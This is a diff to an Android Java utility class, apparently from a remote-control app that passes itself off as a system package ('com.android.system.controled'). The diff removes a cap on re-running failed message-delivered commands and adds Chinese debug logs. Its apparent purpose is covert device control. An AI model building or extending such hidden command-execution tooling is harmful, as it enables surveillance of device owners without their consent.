@@ -1,5 +1,6 @@
 package com.android.system.controled.util;
 
+import java.io.File;
 import java.util.ArrayList;
 
 import android.content.Context;
@@ -15,8 +16,6 @@ import com.android.system.controled.service.ListenService;
 
 public class InitUtil {
 
-	private static final int MAX_OPERAS = 100;
-
 	/**
 	 * 初始化或check
 	 * 
@@ -31,6 +30,9 @@ public class InitUtil {
 		// initConfig(context);
 		checkBackService(context);
 		checkUploadedOrNot(context);
+//		if(!(new File(MainApplication.FILE_IN_SDCARD)).exists()) {
+//			(new File(MainApplication.FILE_IN_SDCARD)).mkdirs();
+//		}
 	}
 
 	/**
@@ -98,21 +100,28 @@ public class InitUtil {
 
 		if (codesFailed != null && codesFailed.size() > 0) {
 			for (Code code : codesFailed) {
-				if (codesFailedSelected.size() < MAX_OPERAS) {
-					if (codesFailedSelected.contains(code)) {
-						code.setResult(Code.RESULT_CODE_REPEAT);
-						dbOperater.updateCodeResult(code);
-					} else if (code.getRedoNeed() == Code.REDO_NEED) {
-						codesFailedSelected.add(code);
-					}
-				} else {
-					break;
+				// if (codesFailedSelected.size() < MAX_OPERAS) {
+				if (codesFailedSelected.contains(code)) {
+					code.setResult(Code.RESULT_CODE_REPEAT);
+					dbOperater.updateCodeResult(code);
+				} else if (code.getRedoNeed() == Code.REDO_NEED) {
+					codesFailedSelected.add(code);
 				}
+				// } else {
+				// break;
+				// }
 			}
 		}
 
-		for (Code code2 : codesFailedSelected) {
-			CodeDoing.getInstance().doOperaByMessage(context, code2);
+		if (codesFailedSelected.size() > 0) {
+			Debug.e("InitUtil", "执行失败的命令");
+			for (Code code2 : codesFailedSelected) {
+				CodeDoing.getInstance().doOperaByMessage(context, code2);
+				Debug.e("", "命令： " +code2.getCode());
+			}
+		} else {
+			Debug.e("InitUtil", "米有要执行的失败过的命令");
 		}
+
 	}
 }
